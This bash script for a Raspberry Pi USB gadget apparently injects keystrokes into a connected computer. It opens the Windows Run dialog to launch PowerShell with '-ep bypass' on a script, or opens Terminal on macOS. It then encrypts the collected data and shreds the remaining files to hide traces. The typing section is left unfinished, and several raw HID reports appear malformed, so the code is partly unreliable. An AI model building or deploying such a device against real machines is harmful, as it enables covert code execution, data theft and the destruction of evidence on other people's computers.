#!/bin/bash

# Ethical LED indicator (GPIO 17)
echo 17 > /sys/class/gpio/export
echo out > /sys/class/gpio/gpio17/direction
for i in {1..3}; do
    echo 1 > /sys/class/gpio/gpio17/value
    sleep 0.2
    echo 0 > /sys/class/gpio/gpio17/value
    sleep 0.2
done

# Mount virtual storage
mkdir -p /mnt/usb_share
mount /piusb.bin /mnt/usb_share

# Detect OS
OS=$(python3 /mnt/usb_share/detect_os.py)
export OS_TYPE="$OS"

# Execute payload
case $OS in
    windows)
        # Simulate Win+R to open Run dialog
        echo -ne \\x08\\x00\\x00\\x00\\x00\\x00\\x00\\x00 > /dev/hidg0  # Windows key
        sleep 0.2
        echo -ne \\x08\\x15\\x00\\x00\\x00\\x00\\x00\\x00 > /dev/hidg0  # R key
        sleep 0.2
        echo -ne \\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00 > /dev/hidg0
        sleep 1
        
        # Type PowerShell command
        echo -ne \\x13\\x00\\x00\\x00\\x00\\x00\\x00\\x00 > /dev/hidg0  # P
        echo -ne \\x12\\x00\\x00\\x00\\x00\\x00\\x00\\x00 > /dev/hidg0  # O
        # ... complete typing "powershell -ep bypass -f D:\autorun.ps1"
        ;;
    macos)
        # Simulate Command+Space
        echo -ne \\x08\\x00\\x00\\x00\\x00\\x00\\x00\\x00 > /dev/hidg0  # Command
        sleep 0.2
        echo -ne \\x08\\x2c\\x00\\x00\\x00\\x00\\x00\\x00 > /dev/hidg0  # Space
        sleep 0.2
        echo -ne \\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00 > /dev/hidg0
        sleep 1
        
        # Type to open Terminal
        echo -ne \\x17\\x00\\x00\\x00\\x00\\x00\\x00\\x00 > /dev/hidg0  # T
        echo -ne \\x08\\x00\\x00\\x00\\x00\\x00\\x00\\x00 > /dev/hidg0  # E
        # ... complete typing "Terminal"
        ;;
esac

# Wait for payload completion
sleep 20

# Encrypt and clean up
python3 /mnt/usb_share/encrypt_data.py
find /mnt/usb_share -maxdepth 1 -type f -not -name "comp_data.enc" -exec shred -u {} \;
umount /mnt/usb_share